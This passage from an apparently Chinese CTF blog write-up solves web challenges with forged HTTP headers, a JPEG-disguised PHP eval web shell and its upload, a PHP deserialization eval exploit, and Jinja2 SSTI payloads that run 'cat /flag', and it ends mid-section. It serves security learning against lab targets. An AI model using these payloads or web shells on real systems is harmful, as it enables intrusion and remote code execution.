text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">X-Forwarded-For:127.0.0.1  </span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag3:MTBuNV95MHVy</span><br><span class="line">&lt;a href=&quot;/soul_discerner&quot;&gt;前往第四关：器灵傀儡&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.3.png" alt="1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /soul_discerner HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:65093</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: moe browser  </span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag4:X2g3N1BfbDN2</span><br><span class="line">&lt;a href=&quot;/heart_seal&quot;&gt;前往第五关：心印傀儡&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.4.png" alt="1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GET /heart_seal HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:65093</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: user=xt; role=xt; auth=1</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag5:M2xfMTVfcjM0</span><br><span class="line">&lt;a href=&quot;/pathfinder&quot;&gt;前往第六关：前尘傀儡&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.5.png" alt="1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GET /pathfinder HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:65093</span><br><span class="line">Referer: http://panshi/entry</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag6:bGx5X2gxOWgh</span><br><span class="line">&lt;a href=&quot;/void_rebirth&quot;&gt;前往第七关：逆转傀儡&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">玉板铭文：阴阳逆乱，归墟可填。以&quot;覆&quot;代&quot;取&quot;，塑吾新生</span><br><span class="line"></span><br><span class="line">使用PUT方法，请求体为&quot;新生！&quot;</span><br><span class="line"></span><br><span class="line"> 请使用工具发送PUT请求</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def send_put_request_and_save():</span><br><span class="line">    url = &quot;http://127.0.0.1:56205/void_rebirth&quot;</span><br><span class="line">    data = &quot;新生！&quot;</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;Host&quot;: &quot;127.0.0.1:56205&quot;,</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36&quot;,</span><br><span class="line">        &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,</span><br><span class="line">        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;,</span><br><span class="line">        &quot;Connection&quot;: &quot;close&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;text/plain; charset=utf-8&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        response = requests.put(url, data=data.encode(&#x27;utf-8&#x27;), headers=headers)</span><br><span class="line">        print(f&quot;状态码: &#123;response.status_code&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        # 保存响应到文件</span><br><span class="line">        with open(&quot;response.html&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:</span><br><span class="line">            f.write(response.text)</span><br><span class="line">        print(&quot;响应已保存到 response.html 文件中&quot;)</span><br><span class="line"></span><br><span class="line">        # 检查是否包含成功关键词</span><br><span class="line">        if &quot;成功&quot; in response.text or &quot;通过&quot; in response.text:</span><br><span class="line">            print(&quot;✓ 恭喜！挑战成功！&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;响应内容已保存，请查看文件确认结果&quot;)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;请求出错: &#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    send_put_request_and_save()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fQ==</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bW9lY3Rme0MwbjZyNDd1MTQ3 MTBuNV95MHVyX2g3N1BfbDN2M2xfMTVfcjM0bGx5X2gxOWghfQ==</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="第十三章-通幽关·灵纹诡影"><a href="#第十三章-通幽关·灵纹诡影" class="headerlink" title="第十三章 通幽关·灵纹诡影"></a>第十三章 通幽关·灵纹诡影</h3><p>文件上传的题目</p>
+<ul>
+<li>仅受仙灵之气浸润的「云纹图」可修复玉魄核心（建议扩展名：.jpg）</li>
+<li>灵纹尺寸不得大于三寸（30000字节）</li>
+<li>灵纹必须包含噬心魔印（十六进制校验码：FFD8FF）</li>
+<li>违禁灵纹将触发九幽雷劫，魂飞魄散！</li>
+</ul>
+<p>要求头部是FFD8FF，扩展名：.jpg</p>
+<p>脚本生成一句话木马</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成flag.jpg文件，头部为FFD8FF，后面接指定PHP代码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_flag_jpg</span>(<span class="params">filename=<span class="string">&quot;flag.jpg&quot;</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># JPEG文件头部字节: FFD8FF</span></span><br><span class="line">        jpg_header = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;FFD8FF&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 要添加的PHP代码</span></span><br><span class="line">        php_code = <span class="string">&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将PHP代码转换为字节</span></span><br><span class="line">        php_bytes = php_code.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 合并头部和PHP代码</span></span><br><span class="line">        file_content = jpg_header + php_bytes</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 写入文件</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(file_content)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;文件 <span class="subst">&#123;filename&#125;</span> 生成成功&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;文件大小: <span class="subst">&#123;<span class="built_in">len</span>(file_content)&#125;</span> 字节&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;生成文件时出错: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    generate_flag_jpg()</span><br></pre></td></tr></table></figure>
+
+<p>然后抓包，再send,有点要注意就是FFD8FF要在HEX里改一下，然后flag.jpg改成php再上传。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:56088</span><br><span class="line">Content-Length: 224</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://127.0.0.1:56088</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynIFBmbukzvUMjAFA</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://127.0.0.1:56088/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarynIFBmbukzvUMjAFA</span><br><span class="line">Content-Disposition: form-data; name=&quot;spiritPattern&quot;; filename=&quot;flag.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">ÿØÿ&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;</span><br><span class="line">------WebKitFormBoundarynIFBmbukzvUMjAFA--</span><br></pre></td></tr></table></figure>
+
+<p>最后用蚁剑连接一下后门就可以得到flag了。</p>
+<h3 id="第十七章-星骸迷阵·神念重构"><a href="#第十七章-星骸迷阵·神念重构" class="headerlink" title="第十七章 星骸迷阵·神念重构"></a>第十七章 星骸迷阵·神念重构</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>应用接受用户输入的GET参数<code>a</code></li>
+<li>直接对输入进行反序列化操作，没有进行任何过滤或验证</li>
+<li>类A的<code>__destruct</code>方法中使用<code>eval()</code>执行类属性<code>$a</code>的内容</li>
+<li>当对象被销毁时，会自动调用<code>__destruct</code>方法</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;a = <span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span>; <span class="comment">// 使用system执行ls命令</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;URL编码后的序列化字符串:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$serialized</span>) . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始序列化字符串:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">URL编码后的序列化字符串:</span><br><span class="line">O%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A15%3A%22system%28%27ls+%2F%27%29%3B%22%3B%7D</span><br><span class="line"></span><br><span class="line">原始序列化字符串:</span><br><span class="line">O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:15:&quot;system(&#x27;ls /&#x27;);&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:58283/index.php/?a=O%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A15%3A%22system%28%27ls+%2F%27%29%3B%22%3B%7D</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">    public $a;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        eval($this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class="line">    unserialize($_GET[&#x27;a&#x27;]);</span><br><span class="line">&#125; app bin dev entrypoint.sh etc flag home lib media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure>
+
+<p>看到flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;a = <span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;URL编码后的序列化字符串:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$serialized</span>) . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始序列化字符串:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:58283/index.php/?a=O%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7D</span><br></pre></td></tr></table></figure>
+
+<p>发送即可获得flag</p>
+<h3 id="ez-SSTI"><a href="#ez-SSTI" class="headerlink" title="ez_SSTI"></a>ez_SSTI</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你的名字是？(use ?name= in url)</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28531/ssti?name=&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">欢迎 49</span><br><span class="line">你已经掌握ssti的精髓了，开始读取flag吧！！🫡</span><br><span class="line">提示模板是Jinja2，参考文章https://www.cnblogs.com/hetianlab/p/17273687.html🤪</span><br><span class="line">推荐工具fenjing，可上网下载，也可进群咨询😉</span><br></pre></td></tr></table></figure>
+
+<p>paylaod1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28531/ssti?name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">欢迎 NSSCTF&#123;6e72997c-2192-4ec3-98a1-3404123b90cd&#125;</span><br><span class="line">你已经掌握ssti的精髓了，开始读取flag吧！！🫡</span><br><span class="line">提示模板是Jinja2，参考文章https://www.cnblogs.com/hetianlab/p/17273687.html🤪</span><br><span class="line">推荐工具fenjing，可上网下载，也可进群咨询😉</span><br></pre></td></tr></table></figure>
+
+<h3 id="第二十章-幽冥血海·幻语心魔"><a href="#第二十章-幽冥血海·幻语心魔" class="headerlink" title="第二十章 幽冥血海·幻语心魔"></a>第二十章 幽冥血海·幻语心魔</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.args <span class="keyword">or</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        password = request.args.get(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="comment"># ... 此处存在SSTI漏洞</span></span><br><span class="line">        login_msg = render_template_string(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-success&#x27;&gt;欢迎: <span class="subst">&#123;username&#125;</span>&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>首先验证是否存在SSTI漏洞，使用简单的数学表达式测试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:62433/?username=&#123;&#123;7*7&#125;&#125;&amp;password=test</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">阵法反馈</span><br><span class="line">Welcome: 49</span><br></pre></td></tr></table></figure>
+
+<p>存在SSTI漏洞</p>
+<p>Payload</p>
